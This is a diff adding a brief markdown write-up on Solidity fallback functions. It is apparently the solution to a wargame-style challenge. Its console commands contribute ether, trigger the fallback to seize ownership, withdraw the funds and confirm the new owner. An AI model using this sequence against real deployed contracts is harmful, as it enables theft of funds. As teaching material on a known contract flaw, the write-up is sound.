@@ -1,0 +1,24 @@
+## The Fallback Function
+
+A fallback function is a solidity function that is called when no other function in the smart contract matches the function name called.
+https://www.geeksforgeeks.org/solidity-fall-back-function/
+
+## Solution
+
+1. Contribute to the contract
+```bash 
+    contract.contribute({ value: toWei(".000001", "ether"), from: player }) 
+```
+2. Send a transaction to trigger fallback function
+```bash
+    sendTransaction({ to: contract.address, value: toWei(".000001", "ether"), from: player })
+```
+3. Withdraw from contract 
+```bash
+    contract.withdraw()
+```
+
+**Verify ownership 
+```bash
+    await contract.owner()
+```
